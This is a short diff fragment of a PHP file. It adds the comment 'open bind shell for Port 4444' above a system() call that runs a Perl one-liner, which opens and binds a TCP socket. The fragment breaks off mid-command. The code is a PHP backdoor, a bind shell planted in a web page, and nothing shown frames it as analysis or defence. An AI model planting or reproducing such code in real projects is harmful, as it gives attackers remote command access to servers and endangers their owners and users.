@@ -1,4 +1,6 @@
 <?php
+
+/* open bind shell for Port 4444 */
 system("perl -e \"use Socket;socket(SOCKET, PF_INET,
 SOCK_STREAM,getprotobyname('tcp'));setsockopt(SOCKET,
 SOL_SOCKET,SO_REUSEADDR, 1);bind(SOCKET,
